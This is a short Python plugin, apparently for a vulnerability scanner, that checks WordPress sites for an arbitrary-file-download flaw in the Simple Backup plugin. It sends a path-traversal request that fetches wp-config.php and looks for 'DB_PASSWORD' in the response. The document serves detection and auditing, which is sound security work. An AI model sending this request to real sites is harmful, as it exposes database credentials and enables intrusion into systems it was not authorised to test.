#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = DWBH
# __type__  = WordPress Simple Backup Plugin Arbitrary Download

import re
def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):
    payload = "/wp-admin/tools.php?page=backup_manager&download_backup_file=../wp-config.php"
    url = arg + payload
    code, head, res, _, _ = curl.curl(url)
    if code == 200 and res.find('DB_PASSWORD') != -1:
        security_hole(url)
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'localhost/wordpress')[1])


